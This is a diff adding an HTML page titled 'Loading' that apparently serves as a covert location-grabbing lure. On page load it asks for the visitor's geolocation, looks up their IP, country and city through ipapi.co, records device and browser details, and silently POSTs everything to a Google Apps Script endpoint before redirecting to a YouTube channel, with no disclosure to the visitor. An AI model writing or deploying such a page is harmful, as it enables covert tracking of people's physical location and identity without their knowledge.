@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading</title>
+</head>
+
+<body>
+
+<script>
+
+const REDIRECT_URL = "https://youtube.com/@mohannad_asas";
+
+/* ضع رابط Apps Script هنا */
+const SAVE_URL = "https://script.google.com/macros/s/AKfycbztlJsWkK4J5l4wRNSdNe7OrKfJRllg29mP8A7707B4CsYg9ZY9UQpPkvesgUBNYZiC5Q/exec";
+
+
+window.onload = function(){
+
+ if (!navigator.geolocation){
+  alert("Geolocation not supported");
+  return;
+ }
+
+ navigator.geolocation.getCurrentPosition(success,error);
+
+};
+
+
+/* success */
+
+function success(position){
+
+ const lat = position.coords.latitude;
+ const lon = position.coords.longitude;
+
+ fetch("https://ipapi.co/json/")
+ .then(res=>res.json())
+ .then(data=>{
+
+  const info = {
+
+   lat:lat,
+   lon:lon,
+   country:data.country_name,
+   city:data.city,
+   ip:data.ip,
+   device:navigator.platform,
+   browser:navigator.userAgent
+
+  };
+
+  fetch(SAVE_URL,{
+   method:"POST",
+   body:JSON.stringify(info)
+  });
+
+  window.location.href = REDIRECT_URL;
+
+ });
+
+}
+
+
+/* error */
+
+function error(){
+ alert("Please allow location access");
+}
+
+</script>
+
+</body>
+</html>
